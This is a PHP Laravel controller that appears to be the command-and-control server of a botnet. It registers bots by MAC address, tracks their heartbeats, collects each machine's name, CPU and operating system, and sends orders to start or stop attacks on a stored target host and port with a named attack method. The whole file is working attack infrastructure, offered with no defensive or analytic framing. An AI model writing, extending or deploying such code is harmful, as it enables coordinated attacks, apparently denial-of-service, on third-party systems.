<?php

namespace App\Http\Controllers;

use App\Bot;

use Illuminate\Http\Request;

use App\Repositories\BotRepository;

use Carbon\Carbon;

class ApiBotsController extends Controller
{

  protected $botRepository;

  /**
   * Create a new controller instance.
   *
   * @return void
   */
   public function __construct(BotRepository $botRepository)
   {
      $this->botRepository = $botRepository;
   }

  /**
  * Store a newly created resource in storage.
  *
  * @param  \Illuminate\Http\Request  $request
  * @return \Illuminate\Http\Response
  */
  public function store(Request $request)
  {
    $data = $request->json()->all();
    $opcode = $data['opcode'];
    $macAddress = $data['payload']['macAddress'];
    $bot = $this->botRepository->findBy('mac_address', $macAddress);


    if ($opcode == 16 || $opcode == 17) {
      $bot = $this->heartBeat($data, $bot);

      if ($bot->needInformation()) {
        return $this->askInformationReponse();

      } elseif ($bot->needAttackStart()) {
        $this->botRepository->update(['state' => 'attacking'], $bot->id);
        return $this->startAttackResonse($bot);

      } elseif ($bot->needAttackEnd()) {
        $attackId = $bot->attack()->first()->id;
        $this->botRepository->update(['state' => 'connected', 'attack_id' => null], $bot->id);
        return $this->stopAttackResonse($attackId);

      } else {
        return $this->successResponse();
      }
    } elseif ($opcode == 32) {
      $bot = $this->storeInformation($data, $bot);
      return $this->successResponse();
    } else {
      return $this->badRequestResponse();
    }
  }

  /**
  * Reponse to send when information about bot is required
  *
  * @return \Illuminate\Http\Response
  */
  protected function askInformationReponse()
  {
    return response()->json([
      'opcode' => 256
    ]);
  }

  /**
  * Reponse to send when nothing else than ok is required
  *
  * @return \Illuminate\Http\Response
  */
  protected function successResponse()
  {
    return response()->json([]);
  }

  /**
  * Reponse to send when bot needs to start an attack
  *
  * @param Bot $bot
  * @return \Illuminate\Http\Response
  */
  protected function startAttackResonse(Bot $bot)
  {
    return response()->json([
      'opcode' => 272,
      'payload' => [
        'id' => $bot->attack()->first()->id,
        'target' => $bot->attack()->first()->target,
        'port' => $bot->attack()->first()->port,
        'method' => $bot->attack()->first()->method()->first()->name
      ],
    ]);
  }

  /**
  * Reponse to send when bot needs to end an attack
  *
  * @param mixed $attackId
  * @return \Illuminate\Http\Response
  */
  protected function stopAttackResonse($attackId)
  {
    return response()->json([
      'opcode' => 288,
      'payload' => [
        'id' => $attackId,
      ],
    ]);
  }

  /**
  * Reponse to send when inconsistent request is sent
  *
  * @return \Illuminate\Http\Response
  */
  protected function badRequestResponse()
  {
    return response()->json([], 400);
  }

  /**
  * Manage bot heartbeat connection to have right state
  */
  private function heartBeat(Array $data, Bot $bot = null)
  {
    if ($bot) {
      if ($data['opcode'] == 16) {
        $this->botRepository->update(['state' => 'connected', 'attack_id' => null, 'connected_at' => Carbon::now()], $bot->id);
      } else {
        $this->botRepository->update(['connected_at' => Carbon::now()], $bot->id);
      }

    } else {
      $bot = $this->botRepository->create(['mac_address' => $data['payload']['macAddress'], 'state' => 'connected']);
    }

    return $bot;
  }

  /**
  * Store information sent by a bot
  */
  private function storeInformation(Array $data, Bot $bot)
  {
    $bot = $this->botRepository->update([
      'name' => $data['payload']['computerName'],
      'cpu' => $data['payload']['cpu'],
      'operating_system' => $data['payload']['operatingSystem'],
    ], $bot->id);

    return $bot;
  }
}
